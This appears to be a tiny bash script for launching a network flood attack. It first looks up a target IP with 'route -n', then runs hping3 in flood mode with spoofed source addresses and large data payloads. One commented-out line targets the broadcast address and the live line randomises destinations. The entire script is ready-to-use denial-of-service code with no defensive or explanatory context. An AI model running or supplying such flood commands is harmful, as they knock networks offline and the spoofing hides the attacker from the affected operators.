#!/bin/bash

# Find target IP:
route -n

# Ping:
#sudo hping3 --flood --spoof <target ip> --data 65535 255.255.255.255
sudo hping3 --flood --spoof <target ip> --data 65535 --rand-dest
